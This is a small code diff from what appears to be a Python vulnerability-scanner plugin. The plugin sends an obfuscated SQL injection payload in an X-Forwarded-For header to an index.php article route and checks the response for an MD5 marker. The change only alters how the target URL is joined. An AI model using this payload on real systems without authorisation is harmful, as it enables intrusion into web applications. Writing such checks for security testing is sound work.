@@ -21,7 +21,7 @@ def run(url, timeout):
         "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
     }
     try:
-        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/article/view_recent/name/1')
+        vurl = url + '/index.php?s=/home/article/view_recent/name/1'
         req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
         if "56540676a129760a" in req.text:
             result['vulnerable'] = True
